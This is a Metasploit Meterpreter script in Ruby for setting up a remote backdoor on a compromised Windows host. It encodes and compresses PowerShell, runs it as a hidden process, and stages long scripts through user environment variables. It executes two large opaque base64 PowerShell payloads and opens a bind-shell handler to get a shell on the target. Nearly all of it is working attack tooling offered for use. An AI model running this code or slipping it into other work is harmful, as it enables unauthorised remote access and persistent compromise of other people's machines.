##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to imporve this script, please try to port it as a post
# module instead. Thank you.
##


# Authors/Contributors: 
# Ben Turner (https://github.com/benpturner/h00k)
# Dave Hardy (https://github.com/davehardy20/)
# Nicholas Nam (nick[at]executionflow.org)
# RageLtMan

#-------------------------------------------------------------------------------
################## Variable Declarations ##################

# Meterpreter Session
@client = client
downloadall = false

@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
  "-r"  => [ false,   "The IP of the system being exploited = rhost"],
  "-a"  => [ false,   "Attempt to download all powershell modules"]

)
meter_type = client.platform

################## Function Declarations ##################

  # Usage Message Function
  #-------------------------------------------------------------------------------
  def usage
    print_line "Meterpreter Script for creating a persistent backdoor on a target host."
    print_line(@exec_opts.usage)
    raise Rex::Script::Completed
  end

  # Function for setting multi handler for autocon
  #-------------------------------------------------------------------------------
  def set_handler(rhost,rport)
    print_status("Starting connection handler at port #{rport}")
    mul = client.framework.exploits.create("multi/handler")
    mul.datastore['WORKSPACE'] = @client.workspace
    mul.datastore['PAYLOAD']   = "windows/shell_bind_tcp"
    mul.datastore['RHOST']     = rhost
    mul.datastore['LPORT']     = rport

    mul.exploit_simple(
      'Payload'        => mul.datastore['PAYLOAD'],
      'RunAsJob'       => true
    )
    print_good("Multi/Handler started!")
  end

  def have_powershell?
    cmd_out = cmd_exec('cmd.exe /c "echo. | powershell get-host"')
    return true if cmd_out =~ /Name.*Version.*InstanceId/m
    return false
  end

  #
  # Insert substitutions into the powershell script
  #
  def make_subs(script, subs)
    subs.each do |set|
      script.gsub!(set[0],set[1])
    end
    if datastore['VERBOSE']
      print_good("Final Script: ")
      script.each_line {|l| print_status("\t#{l}")}
    end
  end

  #
  # Return an array of substitutions for use in make_subs
  #
  def process_subs(subs)
    return [] if subs.nil? or subs.empty?
    new_subs = []
    subs.split(';').each do |set|
      new_subs << set.split(',', 2)
    end
    return new_subs
  end

  #
  # Read in a powershell script stored in +script+
  #
  def read_script(script)
    script_in = ''
    begin
      # Open script file for reading
      fd = ::File.new(script, 'r')
      while (line = fd.gets)
        script_in << line
      end

      # Close open file
      fd.close()
    rescue Errno::ENAMETOOLONG, Errno::ENOENT
      # Treat script as a... script
      script_in = script
    end
    return script_in
  end

  #
  # Return a zlib compressed powershell script
  #
  def compress_script(script_in, eof = nil)

    # Compress using the Deflate algorithm
    compressed_stream = ::Zlib::Deflate.deflate(script_in,
      ::Zlib::BEST_COMPRESSION)

    # Base64 encode the compressed file contents
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$stream = New-Object IO.MemoryStream(,"
    psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
    # Read & delete the first two bytes due to incompatibility with MS
    psh_expression += "$stream.ReadByte()|Out-Null;"
    psh_expression += "$stream.ReadByte()|Out-Null;"
    # Uncompress and invoke the expression (execute)
    psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
    psh_expression += "$(New-Object IO.Compression.DeflateStream("
    psh_expression += "$stream,"
    psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
    psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

    # If eof is set, add a marker to signify end of script output
    if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end

    # Convert expression to unicode
    unicode_expression = Rex::Text.to_unicode(psh_expression)

    # Base64 encode the unicode expression
    encoded_expression = Rex::Text.encode_base64(unicode_expression)

    return encoded_expression
  end

  #
  # Execute a powershell script and return the results. The script is never written
  # to disk.
  #
  def execute_script(script, time_out = 15)
    running_pids, open_channels = [], []
    # Execute using -EncodedCommand
    session.response_timeout = time_out
    cmd_out = session.sys.process.execute("powershell -EncodedCommand " +
      "#{script}", nil, {'Hidden' => true, 'Channelized' => true})

    # Add to list of running processes
    running_pids << cmd_out.pid

    # Add to list of open channels
    open_channels << cmd_out

    return [cmd_out, running_pids, open_channels]
  end

  #
  # Powershell scripts that are longer than 8000 bytes are split into 8000
  # 8000 byte chunks and stored as environment variables. A new powershell
  # script is built that will reassemble the chunks and execute the script.
  # Returns the reassembly script.
  #
  def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))

    # Check to ensure script is encoded and compressed
    if compressed_script =~ /\s|\.|\;/
      compressed_script = compress_script(compressed_script)
    end
    # Divide the encoded script into 8000 byte chunks and iterate
    index = 0
    count = 8000
    while (index < compressed_script.size - 1)
      # Define random, but serialized variable name
      env_prefix = "%05d" % ((index + 8000)/8000)
      env_variable = env_prefix + env_suffix

      # Create chunk
      chunk = compressed_script[index, count]

      # Build the set commands
      set_env_variable =  "[Environment]::SetEnvironmentVariable("
      set_env_variable += "'#{env_variable}',"
      set_env_variable += "'#{chunk}', 'User')"

      # Compress and encode the set command
      encoded_stager = compress_script(set_env_variable)

      # Stage the payload
      print_good(" - Bytes remaining: #{compressed_script.size - index}")
      execute_script(encoded_stager)

      # Increment index
      index += count

    end

    # Build the script reassembler
    reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
    reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
    reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
    reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

    # Compress and encode the reassemble command
    encoded_script = compress_script(reassemble_command)

    return encoded_script
  end

  #
  # Log the results of the powershell script
  #
  def write_to_log(cmd_out, log_file, eof)
    # Open log file for writing
    fd = ::File.new(log_file, 'w+')

    # Read output until eof and write to log
    while (line = cmd_out.channel.read())
      if (line.sub!(/#{eof}/, ''))
        fd.write(line)
        vprint_good("\t#{line}")
        cmd_out.channel.close()
        break
      end
      fd.write(line)
      vprint_good("\t#{line}")
    end

    # Close log file
    fd.close()

    return
  end

  #
  # Clean up powershell script including process and chunks stored in environment variables
  #
  def clean_up(script_file = nil, eof = '', running_pids =[], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)
    # Remove environment variables
    env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
    env_del_command += "Select-String #{env_suffix}|%{"
    env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"
    script = compress_script(env_del_command, eof)
    cmd_out, running_pids, open_channels = *execute_script(script)
    write_to_log(cmd_out, "/dev/null", eof)

    # Kill running processes
    running_pids.each() do |pid|
      session.sys.process.kill(pid)
    end


    # Close open channels
    open_channels.each() do |chan|
      chan.channel.close()
    end

    ::File.delete(script_file) if (script_file and delete)

    return
  end


################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-r"
    rhost = val
  when "-a"
    downloadall = true
  end
}

# End of file marker
eof = Rex::Text.rand_text_alpha(8)
env_suffix = Rex::Text.rand_text_alpha(8)

# check/set vars
script_in = read_script("/root/Desktop/powerfun.ps1")

# Get target's computer name
computer_name = session.sys.config.sysinfo['Computer']

# Compress
print_status('Compressing script contents.')
compressed_script = compress_script(script_in, eof)

# If the compressed size is > 8100 bytes, launch stager
if (compressed_script.size > 9998100)
  #print_error("Compressed size: #{compressed_script.size}")
  error_msg =  "Compressed size may cause command to exceed "
  error_msg += "cmd.exe's 8kB character limit."
  print_error(error_msg)
  print_status('Launching stager:')
  script = stage_to_env(compressed_script, env_suffix)
  print_good("Payload successfully staged.")
else
  print_good("Compressed size: #{compressed_script.size}")
  script = compressed_script
end

if (downloadall == true)
testscript="JABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAZQBOAHEAMQBWAHQAdAB1ADQAegBZAFEAZgBhADYALwBnAGoARABVAHIAbwBTADEAYQBTAGQAQQBYAGcASgBrADAAZABSAHgARgBrAGIAMwBZAHEAeQB6AG0AdwBLAEcAZwBUAEQAVQAyAE8ASwBhAEoAZwBWAHkARgBEAG4AZAA1AE4AOAA3ADEAQwBXADIAZwB6ADQAVQB4AFoAbwB2AGsAdQBaADIAaABtAGUARwBRAHkAMABMAEkAMQBGAFoAdwA5ADQARAA5AG0ALwBoAFgAbQBvAEYAQgB0AG0AUABEAHEATQBWAGwAWgBKAGQAcwBFADkAUQA5AGoALwBmAGYAdwBlAEoAOQBJAHEAYwBqAEUAYQBWAFUAVwB2AEMAdgAzAHEANABnAHEAVQBvAE4ASQA0AGMAcABLAFIAUgBRAG4AdAB5AGoATgBBAFYAOABHAEkAMQBkAFgAYgA3AHkARgA5AFoAawBIAHgAUAAwAHQAcAAyAG4AagB1AGQAWgBaAHMAWQB5AGwAeQBLAGsARgBIAFEAUgBoAHUAYgBGAGgAcQBDADcAKwA5AHgANQAwADIARwBtAFAAdgB6AHcAYwBDAEoAawBxADgAVQBaAHMAVgA5ADQAYwBGAEoAYQA1AEEAaQBjAG0AawAzAGcANAAxAEEAVgBFAHYAdwBLAEUASwB3AHcAZABTAFcANABHAGEANQB0AGcAcABKADUAUgBIAGMAWQBHAFIAVABHAEcAOQBCAEYAcABYAEIAeABEAHoAWQBOAGYAVAA3AHMAdwB5ADAAbABxAFQAaQB1AFQAOQA1ADAAegBzAGkAMQBKAFgAVwBFAHgAUABZAEoAZABuAFAAQgBCAHQAdgBsADAAcQBqAEUALwB0AFkASAA5AFYARwByAFEAWAArAGYAVwB5AGMAVAA4AHAAOABGAHkATwBiAFAAeAA0AE4ASwBMAFQAcgArACsAbAAwAEsAcgB3AHYAcgBVAHUAUABpAHYATQBuAFAASABwADAAdABDADkALwBWAEoAZwBiAHQAWQBGADAASgBoADIAQQA4AFoAbgBGAG8AegBmAGUARgAxAGoAcQAwAEgAWQBQAE0AQgAzAC8AagB3ADcAOABCAGsAcgAzAHIANQAzAFkAQQBCAFYAZwBYAGEAUABlAFcASwB0ADkAQwAxAHAASgB2AHUAYgB0ADgAMgBkAEgALwBxAGEAZwBIAE8AVABoADcAWQBIAGUAcQB1AGgASgBwADUANABnAFcAcABHAFoAQQBVAGQAVABZAGoANgBqADIAcwBHAEcAaAA4AGsAMQBzADMASQBOADYAUABtAE4AegBEADgAMABGAG8AdQB6AHMAQQA2ADkATwBCAEgAcABNAEUANABxADYAZgB6ACsARQBXAEcAKwBXAEUAVABoAEcAYwBiAE8AawBQAFAAVABzADcATwBuAFgAMwA4AE0AbgAyAHUAMwBaAG0ASgBlADcAQQBXADQAbABCAEoAeQBKAEoAaAA2AFUARABhAGgASQBtAG8AaQBFAEoAdABnAFcAZgB0AHcAcQB2AHEAcwBrAHMAVQBKAGEAMQBMADMAWQBOAEkAVwBLAHAANABqAGIASgBHAEQAbwBUAG0AawB6AEcAcAB4AGYAbgA0ADUARwAwADAAbQBTAGYARAA3AEkAOQBqAEUAMwBWAHQAbABVAGwAdAA2AFYAdABjADgAegBLAHcANwBFADgANgBkAFUANgBzAE0AVwBUAHgASwAyAE8AbgB3ADUASQB4ADkAVgBOAEoAWgBiADUAZgBJAFIAdABiAGwAdABtADQANgB6AGkANgAxAFoAcABXAGwAWgB3ADYAbwBDAEEAKwBRADgAagB0AHoAWgA3AG8ASABDAGYATgBiAHAAeABEAGkAWABXAHEAOQBZAFcALwAzAHcAVAArAEEAVwBXAEgAVwBVAEgAOQB0ADMAVgBqAEkAagBNAFgATgBvAEcAYgBLAHYATQB6AHMATwBtAGgAOQBzADkAQwBLAEQAMgA2AGMAaABGAC8AWgAwAG0AZwByAFUAbQBLAEUATgB0AHMARwBTAEoANABVAGIAQwB1AFgANQB4AHEAaAB6AEoAUwBHAE8ASQA1AFUANABMAEYASgA4AEEAdQBJAE4ASwA0AHIAMQBHAFAARABIAG8AcwBPAE0AawB0AFkAMwB3AEEAYgB2AG8ASgBuADAAVABqAHcAQwB1AGsATgBjAFgAeAA0AHkAegBVAHQARQB4AFMAOABZAG4AegBjAFYARwBEAG4AbQB3AG8AVQBJAFkARwA5AEcARQAwADEAcQA5AHgAYgBtAGwAaQBrAGsAcAAxAFQAeABaAG0AUQA2ADEARABhAHkAZgBpAHYASgBzAHIAcAB1ADkAOQBPADIAQgBQADcAWABHAEMALwBkAG0AYwBOAGwAdwBjACsAcAA2AHoAYQBiAHgAdgBoAEwAZQB0AE8AWgA2AHgATAB6ADMAaABGAE4ARwBvAHIAcQA1AEkAbQBmAEMAbwB3AEMAOQBwADMAcgBOAHYANQBKAGQAbwBHAHEAQQBpAGMAcwAyADQAKwBYAEIAQwBLAEoAUgBSAGYAbwBTAFMAawByAGgAUgBjAGEAaABBAHUARAB0ADgANwBzAEkAdAA5ADUATABjAHMAMgByADUATwBpAFQAYgA0AG4AegBwADAARgAyAGEAZgBpAEgALwB0AHEALwAyADIAZQB1AG0AcQAxAHoANwBYAHUAdgBBAFoASABSAGYAVwA5AE0AVABlAEUAZQBRAGoAYgBUADIAMABoACsAMwBsAE0ATQA3AFEANQBpAFMAawA5AG0AbgArAEoARABxADAALwBnAEcAMAA1AHcAVwBVACcAKQApACkAOwAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZABCAHkAdABlACgAKQB8AE8AdQB0AC0ATgB1AGwAbAA7ACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkAEIAeQB0AGUAKAApAHwATwB1AHQALQBOAHUAbABsADsAJAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKAAkAHMAdAByAGUAYQBtACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAOwAnAEUAcwBOAFQAZQBhAE8AUgAnAA=="

else
testscript = "JABzAHQAcgBlAGEAbQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAZQBOAHEAMQBWAG0AMQB2AEcAagBrAFEALwBuAHoAOABDAG8AdgBzAFgAWABkAFYATQBDAFIAUwB2AGsAUgBLADEAWgBTAFEAQwBsADEAZgBVAEUAbQBiAFMAZwBnAHAAagBuAGQAZwBYAFkAeQA5AHMAbwBjAHMAdQBTAGIALwAvAGMAYgA3AEUAaQBDADYARAA2AGUAcQBXAEUATABlAG4AYgBkAG4ALwBNAHgANABsAHYAbgBhAFMARgBUAFcAcwBQAGUAQQAzAFIAdQA0AGsAMQBxAEIAUQBmAGEAegB4AFcAaABGAGgAVwBUAG4ANwBCAE0AVQAzAGMAOQAzAFAAMABBAGkAUABTAEkAbgBvADAARgBwADEASgBqAHcAcgB4ADQAdQBZAFMANwBXAEcAZwBjAE8AVQB0AEkAbwBvAFQAMAA1AFIAdQBqAFcAOABHAHcAMQBkAG4AYgB6AHcARgA5AFkAawBIAHgASAAwAHQAaQAyAG4AbABxAHQAZQBaAE0AWQB5AGwAeQBLAGsARgBIAFEAUgBpAHUAYgByAGoAVQBFADMANwBkAHgANgAxAFcARwBtAFAAdQB6AFgAcwArAEoAZwBpADgAVQBaAHUAdQA3AHQAUQBjAG4AcgBVAEcASwB5AEsAVgBkADkAVgBZAEMAVQBjADMAQgBvAHcAagBCAGUAbQBOAGIAZwBKAHYAawAyAGkAbwBrAGwAVQBkAHcAdgBZAEYATgBZAGIAZwBCAHUAUwA0AE4AUgB1AGIAZQBMAHEASABiAG4AVwBTAGcAdABTAFEAVgB6AC8AMwB4AHEAOAA0AEIAbwBTADYAMQBIAHAAbgBBAEwAcwBsACsASgA5AGgAdwBNADEAYwBhAG4AZABqAEYAKwBxAGgAVwBhAGkAbgB3AG4AMABQAGoAZgBGAEwAbQBoAHgAagBZAC8ATwBGAGcAUQBLAEYAZAAzADQALwBIAFkAKwBGADkAWQBWADEANgBVAEoAeQAvADQAYwBHAGoAbwAzAFAANQBnADgASgBjAHEAeABXAGsARQArAGsAQQBqAE0AOABzAEgAcgB6AHgAdgBzAEIAYwBoADcAYQA3AGgALwBIAHcARgB6AHIAdwBHAHkAagBkAHYAWABKAGkAQgBWAFMAQQBaAFkAVgA2AGIAYQAzADIARABXAGcAcAArAFoAbwAzACsAKwArAE8ALwBFADEAQgAwAGMAdgBEADAAegAwADkAbABkAEcAVABWAGoAVgBCAHQAQwBJAHoAQQA0ADYAbQB4AEgAUgBDAHQAWQBNAFYARAA1AE4AcgBZAHUAVQBTADAAUABOAHIAbQBYACsAbwBMAFcAYQBuAFkAZQAxADcAYwBTAEwAUwBZAFoAeQBVADAAdQBuAGQAQQA4AEoAMABOAG8AdgBDAEgAcwBaAE8AbgAvAE8AVAAwADkAUABIAFAAMwAvADIAbgB5AHEAMwBlAG0ASwBlADcAdwBTADQAawBCAEoAeQBKAEoAaABxAFUATgBhAGgASQBtAG8AaQBFAEsAdABnAFcAZgBsAHcAcQB2AHEAawBsAE0AVQBKAHEAMQBQADMAWQBOAEkARwBLAHAANABpAGIASgBDAEQAbwBUAG0AawB6AEcASgAyAGQAbgBZAHgARwBZAHgARwBTAGYAQgA3AEYAMgB6AGkAOQBvADAAeQBxAFMAMAA4AHEAMgBvAGUAWgB0AGEAdABDAGYAZgBPAHEAVQBXAEcATABCADQAawA3AEsAUgAvAGYATQBvACsASwB1AG0AcwB0ADMATgBrAEEAKwB0AHkAVwB6AFUAZABaAHgAZABhAHMAOQBMAFMATQB3AGQAVQBoAEgAdABJACsAYQAyADUATgBlADIAOQBoAFAAbQBOAFUAdwBqAHgATgByAFYATwB2ADcATgA5ADQAUgAvAEEATABEAEMAcgBxAFQAKwA2AHMAbQA0AG8AWgBNAGIAaQBlAGwASQB6AFoAWgA2AEgAZABoAFgAMQBxAFAAcQAyAEgATgBFAHYAMwB2AHYAbwBKAFAAegBTAEYAawBaAGIAawBSAEkAcABkAE4ANABtAFIAUABLAG8AWQBGAFAANQBQAEYAVQBvAFIAYQBZADAAeABIAEcAawBBAHAAZAAxAGsAbAA5AEEAcABIAEYAVgBwAFEANwByAGQAMQBpADAAbAAxADMAQwB1AGcAWgBZAHYAOABxAGcAUwBxAEEAOAA0AFQAQgB3AEMAKwBrADEAOABiAHoALwBwAGEAdgBiAEoAaQBoADQAeQBmAHEAdwByAHMATABXAE4AeABVAG8AUQBnAEkANwBNAGUAcQBLAGwAcwBrADMAVgBMAEYASQBKAFYAdQBuAGsAagBjAGgAbAA2AEcAOABvACsASAAzAE8AcwByAEoAbQA3ACsATwAyAFMAUAA3AHYATQBaAHUANQBjADUAcQBQAHYAZAA4AFQAbABoADUAMwBpAGIAQwBhADkAWQBlAFQAMQBpAGIAOQBuAGgAQgBQAEcAbwByAHkANwBJAG0AZgBDAHcAdwBDADkAbwAzAHIATgAzADYASQA5AG8ARQBxAEEAaQBjAHMAMgA3AGEAbgB4AEcASwBKAFIAUgBmAG8AaQBTAGsATABoAFYAYwBhAGgAQQB1AEQAdQA5AGIAcwBQAE4AZAA1AE4AYwBzADIAcgB4AE0AaQBRADcANAB2ADcAcAAwAEcAMgBhAFgAaQBQAC8AcwByAGQAMwBXAGUAdQA2AHMAbAB6ADUAWABlAHUAMAB6AHUAagBLAHMAMQBPAHgAZABRAHoANwBRADEAawBOAHoANABaADQAdgA1AEEAUgB0AFQAawBKAHEAbgAvAHIAZgBSAEkAdgBXAHYAMABmAHoAQgBpAEEAPQAnACkAKQApADsAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAQgB5AHQAZQAoACkAfABPAHUAdAAtAE4AdQBsAGwAOwAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZABCAHkAdABlACgAKQB8AE8AdQB0AC0ATgB1AGwAbAA7ACQAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACgAJABzAHQAcgBlAGEAbQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApADsAJwBoAE8ARgBJAGIATAB0AGMAJwA="

end
cmd_out, running_pids, open_channels = execute_script(testscript, 15)

# you can replace this compressed script by using the functions above
# Execute the powershell script
print_status('Executing the script: ' + script)
#cmd_out, running_pids, open_channels = execute_script(script, 15)

# Default parameters for payload
rhost = @client.session_host
rport = 55555

set_handler(rhost,rport)
print_status("If a shell is unsuccesful, ensure you have access to the target host and port. Maybe you need to add a route (route add ?)")





